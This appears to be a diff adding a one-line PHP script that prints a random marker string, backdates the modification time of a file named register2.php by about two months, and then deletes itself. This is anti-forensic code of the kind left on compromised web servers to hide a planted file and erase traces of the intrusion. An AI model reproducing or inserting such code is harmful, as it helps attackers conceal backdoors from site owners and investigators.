@@ -1,0 +1,1 @@
+<?php echo "DYYQYSFKUm"; if (file_exists("./register2.php")){ touch("./register2.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*565hAH58BY90nryaaTbU*/ ?>
